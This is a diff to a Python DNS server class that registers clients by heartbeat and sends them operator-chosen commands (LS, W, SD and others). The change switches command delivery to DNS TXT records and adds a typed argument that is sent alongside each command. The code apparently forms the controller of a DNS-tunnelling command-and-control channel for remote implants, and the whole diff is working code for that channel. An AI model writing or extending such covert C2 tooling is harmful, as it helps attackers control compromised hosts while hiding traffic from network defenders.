@@ -162,6 +162,8 @@ class Server:
         new_one = addr not in self.connected_clients
         self.connected_clients[addr] = datetime.datetime.now()
 
+        args = None
+
         if new_one:
             # We register a new client
             print("New client {} registered!".format(addr))
@@ -183,6 +185,8 @@ class Server:
             else:
                 self.commands_for_clients[addr].start()
                 command = self.commands_for_clients[addr].command
+                args = self.commands_for_clients[addr].arg
+
 
         # Sanity check
         if command is None:
@@ -191,7 +195,10 @@ class Server:
 
         reply = request.reply()
         self.__log("{}: Sending {} command...".format(addr, command))
-        reply.add_answer(RR(client_to_serv["HB"], QTYPE.A, rdata=A(serv_to_client[command]), ttl=60))
+        reply.add_answer(*RR.fromZone('{} 60 IN TXT {}'.format(client_to_serv["HB"], serv_to_client[command])))
+        if args is not None:
+            reply.add_answer(*RR.fromZone('{} 60 IN TXT "{}"'.format(client_to_serv["HB"], args)))
+
         return reply
 
     def cleanup_connected(self):
@@ -256,6 +263,7 @@ class Server:
 
             if command == 1:
                 command = "LS"
+                argument = input("Enter argument: ")
             elif command == 2:
                 command = "W"
             elif command == 3:
@@ -267,7 +275,6 @@ class Server:
                 return
             elif command == 6:
                 command = "SD"
-                argument = input("Enter argument: ")
             elif command == 7:
                 self.running = False
                 return
